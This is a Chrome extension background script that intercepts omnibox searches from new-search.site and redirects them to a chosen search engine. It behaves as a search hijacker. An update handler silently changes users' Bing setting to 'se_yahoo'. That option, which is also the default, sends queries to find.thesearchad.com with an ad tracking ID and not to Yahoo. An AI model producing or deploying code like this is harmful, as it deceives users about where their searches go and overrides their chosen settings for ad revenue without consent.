// Open extension page after clicking on the icon
/*chrome.browserAction.onClicked.addListener(() => {
  chrome.tabs.create({
    url: chrome.extension.getURL("html/options.html")
  });
});*/

chrome.runtime.onInstalled.addListener(function(details){
	if (details.reason == "update"){
        console.log("Update");
		  chrome.storage.sync.get("searchConfig", function(result) {
			  if (result.searchConfig){
				console.log("current search engine - " + result.searchConfig.searchEngine);
				if (result.searchConfig.searchEngine == "se_bing"){
					var searchConfig = Object.assign({}, result.searchConfig); 
					searchConfig.searchEngine = "se_yahoo";
					chrome.storage.sync.set({searchConfig});
				}
			  }			
		  });
    }
});

// set uninstall url
chrome.runtime.setUninstallURL("https://new-search.site/uninstall/");

// Activate omnibox search engine which was selected on the new tab
var searchEngine;

chrome.storage.sync.get("searchConfig", function(result) {
  if (result.searchConfig === undefined) {
    searchEngine = "se_yahoo";
    console.log(
      "searchEngine was checked in sync storage, searchEngine = undefined; searchEngine was made " +
        searchEngine
    );
  } else {
    searchEngine = result.searchConfig.searchEngine;
    console.log(
      "searchEngine was checked in sync storage, searchEngine = " + searchEngine
    );
  }

  chrome.webRequest.onBeforeRequest.addListener(
    omniSearch,
    {
      urls: ["https://new-search.site/search/?os=t*"],
      types: ["main_frame"]
    },
    ["blocking"]
  );
});

// Check search engine and update it if necessary if sync storage was changed
chrome.storage.onChanged.addListener(function() {
  console.log("Sync storage onChanged event listened");

  chrome.storage.sync.get("searchConfig", function(result) {
    if (result.searchConfig === undefined) {
      searchEngine = "se_yahoo";
      console.log(
        "searchEngine was checked in sync storage, searchEngine = undefined; searchEngine was made " +
          searchEngine
      );
    } else {
      searchEngine = result.searchConfig.searchEngine;
      console.log(
        "searchEngine was checked in sync storage, searchEngine = " +
          searchEngine
      );
    }

    chrome.webRequest.onBeforeRequest.removeListener(omniSearch);
    chrome.webRequest.onBeforeRequest.addListener(
      omniSearch,
      {
        urls: ["https://new-search.site/search/?os=t*"],
        types: ["main_frame"]
      },
      ["blocking"]
    );
  });
});

var omniSearch = function(details) {
  console.log("onOmniSearch event listened");

  if (searchEngine === "se_google") {
    var result =
      "https://www.google.com/search?q=" +
      new URL(details.url).searchParams.get("q");
  } else if (searchEngine === "se_bing") {
    var result =
      "https://www.bing.com/search?q=" +
      new URL(details.url).searchParams.get("q");
  } else if (searchEngine === "se_yandex") {
    var result =
      "https://www.yandex.ru/search/?text=" +
      new URL(details.url).searchParams.get("q");
  } else if (searchEngine === "se_baidu") {
    var result =
      "https://www.baidu.com/s?ie=utf-8&wd=" +
      new URL(details.url).searchParams.get("q");
  } else if (searchEngine === "se_yahoo") {
    var result =
      "https://find.thesearchad.com/results.aspx?gd=SY1004015&searchsource=58&q=" +
      new URL(details.url).searchParams.get("q");
  } else if (searchEngine === "se_ask") {
    var result =
      "http://www.ask.com/web?q=" + new URL(details.url).searchParams.get("q");
  } else {
    var result =
      details.url +
      (details.url.indexOf("?") == -1 ? "?" : "") +
      (details.url.indexOf("&s=") == -1 ? "&s=" + searchEngine : "");
  }

  return {
    redirectUrl: result
  };
};
